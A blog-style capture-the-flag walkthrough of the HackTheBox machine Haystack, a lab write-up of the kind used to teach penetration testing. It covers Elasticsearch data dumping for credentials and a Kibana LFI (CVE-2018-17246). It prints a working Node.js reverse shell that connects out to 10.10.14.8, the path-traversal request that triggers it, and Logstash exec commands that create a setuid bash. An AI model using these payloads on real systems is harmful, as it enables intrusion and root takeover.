---
categories:
- CTF
layout: post
media_subpath: /assets/posts/2019-06-30-haystack-hackthebox
tags:
- hackthebox
- kibana
- lfi
- linux
- logstash
title: Haystack @ HackTheBox
---

Haystack is a 20 points machine on hackthebox, which in my opinion is not as easy as one might think. It involves some typical ctf steps for user and a nice privilege escalation which requires abusing a LFI in a locally listening kibana instance. The final step is about abusing logstash in order to escalate to root.

## User

The initial port scan shows the following open ports:

```
Nmap scan report for haystack (10.10.10.115)
Host is up (0.73s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9200/tcp open  wap-wsp
```

On port 80 we find a picture. We grab it and run strings on it, revealing a base64 string:

```
bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
la aguja en el pajar es "clave"
```

We now focus on tcp port 9200, where a elastic search instance is running. To get to the data we first need to list the indexes, under which it is stored:

```
http://10.10.10.115:9200/_cat/indices?v

health status index                           uuid                   pri rep docs.count docs.deleted store.size pri.store.size
green  open   .monitoring-es-6-2019.06.30     0MWTVUh7RsSjWJEBtu-7PQ   1   0        152           46    166.5kb        166.5kb
yellow open   quotes                          ZG2D1IqkQNiNZmi2HRImnQ   5   1        253            0    262.7kb        262.7kb
green  open   .monitoring-kibana-6-2019.06.30 yo2RvTi9SAC_uCDqRyYCnw   1   0         12            0     45.6kb         45.6kb
yellow open   bank                            eSVpNfCfREyYoVigNWcrMw   5   1       1000            0    483.2kb        483.2kb
green  open   .kibana                         6tjAYZrgQ5CwwR0g6VOoRg   1   0          1            0        4kb            4kb
```

Now we can use [elasticdump](https://www.npmjs.com/package/elasticdump) to dump the contents:

```
elasticdump \
  --input=http://10.10.10.115:9200/bank \
  --output=bank.json \
  --type=data

elasticdump \
  --input=http://10.10.10.115:9200/quotes \
  --output=quotes.json \
  --type=data
```

Grepping the "quotes.json" for "clave" gets us two other base64 strings:

```
cGFzczogc3BhbmlzaC5pcy5rZXk=
pass: spanish.is.key

dXNlcjogc2VjdXJpdHkg
user: security
```

With these credentials we can log into the box via ssh and grab the user flag.

## Root

We run `ss -tulpen` and see the following open ports:

```
Netid State      Recv-Q Send-Q          Local Address:Port
udp   UNCONN     0      0                   127.0.0.1:323
udp   UNCONN     0      0                         ::1:323
tcp   LISTEN     0      128                         *:80
tcp   LISTEN     0      128                         *:9200
tcp   LISTEN     0      128                         *:22
tcp   LISTEN     0      128                 127.0.0.1:5601
tcp   LISTEN     0      128          ::ffff:127.0.0.1:9000
tcp   LISTEN     0      128                        :::80
tcp   LISTEN     0      128          ::ffff:127.0.0.1:9300
tcp   LISTEN     0      128                        :::22
tcp   LISTEN     0      50           ::ffff:127.0.0.1:9600
```

On port 5601 there is a kibana instance listening. In order to reach it we use dynamic port forwarding `ssh -D9090 security@haystack`, resulting in a socks proxy which we set in burp, allowing us to connect to the target site with firefox. After exploring the application a bit and searching for publicly known vulnerabilities we find this [exploit](https://github.com/mpgn/CVE-2018-17246).

We place the following shell from the github repository in /tmp:

```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8000, "10.10.14.8", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

Then run the LFI query to trigger the shell:

```
GET /api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../tmp/xct.js
```

![](htb_haystack_kibana.png)We saw earlier that the logstash application is running as root, so we explore how this one works. Looking at its config folder we see the following:

```
ls /etc/logstash/conf.d
filter.conf
input.conf
output.conf

cat /etc/logstash/conf.d/input.conf
input {
    file {
        path => "/opt/kibana/logstash_*"
        start_position => "beginning"
        sincedb_path => "/dev/null"
        stat_interval => "10 second"
        type => "execute"
        mode => "read"
    }
}

cat /etc/logstash/conf.d/output.conf
output {
    if [type] == "execute" {
        stdout { codec => json }
        exec {
            command => "%{comando} &"
        }
    }
}

cat /etc/logstash/conf.d/filter.conf
filter {
    if [type] == "execute" {
        grok {
            match => { "message" => "Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}" }
        }
    }
}
```

In "input.conf" we see that a file that is named "logstash\_any" will be used as a input for "execute" every 10 seconds. In "filter.conf" we see that "execute" will try to match a regex, that if successful leads to the execution of the command (as root because logstash is running as root). We create the required file with the following commands:

```
echo "Ejecutar comando: cp /bin/bash /bin/xbash" > logstash_xct
echo "Ejecutar comando: chmod u+s /bin/xbash" >> logstash_xct
```

After waiting a moment we can call `xbash -p` and get a root shell (remember if you use this your first task as root should be to delete xbash). Thanks to [jkr](https://www.hackthebox.eu/home/users/profile/77141) for this nice little bash trick and congrats for the system blood on this box!